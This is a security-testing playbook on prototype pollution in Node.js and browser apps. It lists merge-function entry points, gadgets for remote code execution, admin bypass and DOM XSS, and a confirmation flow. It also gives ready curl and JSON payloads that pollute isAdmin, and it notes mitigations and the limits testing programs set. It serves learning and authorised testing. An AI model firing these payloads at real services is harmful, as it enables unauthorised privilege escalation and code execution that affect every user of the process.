# Prototype pollution — playbook

## when to try
- JavaScript backend (Node.js) or client (any SPA).
- Endpoints that merge user-controlled JSON into objects: settings, profiles,
  config-import, "deep merge" libraries (lodash `_.merge`, `_.set`, jQuery
  `$.extend`, hoek), bulk-update.
- Client side: query params parsed into objects (`qs`, `query-string`),
  hash-router state, postMessage handlers.

## the mechanic
- `obj['__proto__']['polluted'] = 'yes'` makes EVERY object in the runtime
  inherit `polluted: 'yes'`. (Or `constructor.prototype` for the class form.)
- Pollute ONCE, then exploit a downstream gadget.

## gadgets (server-side, Node)
- **RCE via `child_process.spawn`**: pollute `Object.prototype.shell = '/bin/sh'` then `spawn('node', [], {})` uses the polluted shell. Other hooks: `NODE_OPTIONS`.
- **Auth bypass**: pollute `isAdmin: true` → middleware that does `if (req.user.isAdmin)` lights up for everyone.
- **Deserialization confusion**: many libs that "fill in defaults from prototype" hand attacker config.
- **Escalation via templating engine**: pollute fields the template reads as code (Pug, Handlebars).

## gadgets (client-side)
- **DOM XSS via library config**: lib reads `Object.prototype.template = '<img src=x onerror=alert(1)>'` and renders it.
- **CSP bypass**: pollute `script-src` defaults.
- See `dom-based.md`.

## confirmation flow
1. Submit `{"__proto__":{"polluted":"yes"}}` (or `?__proto__[polluted]=yes` in URL).
2. Then send another request that creates a fresh object and ask the server to echo it (e.g. fetch profile). Look for `polluted: yes` in the response.
3. If not echoed, try a known gadget for the framework (e.g. Express `req.body` → response).
4. **Server-side direct PoC**: trigger a code path that uses `Object.prototype` defaults — varies per app.

## exploitation snippet
Simple pollution:
```bash
curl -sk -X PATCH https://t/api/settings -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'
# then call an admin-only endpoint with the same session
curl -sk https://t/api/admin/users -H "Cookie: ..."
```

`constructor.prototype` form:
```json
{"constructor":{"prototype":{"isAdmin":true}}}
```

## caveats
- **Cleanup is hard**. A successful pollution affects EVERY user's session in the same Node process until restart. Many programs explicitly forbid live tests — use staging or report based on traceable evidence (e.g. version-of-lodash + reachable merge).
- Modern Node (22+) `--disable-proto=throw` mitigates `__proto__`; `Object.create(null)` configs avoid the gadget. Look at versions before exploiting.

## provenance
Olivier Arteau "Prototype pollution" 2018. PortSwigger Prototype Pollution labs. Snyk advisories on lodash/jquery/qs.
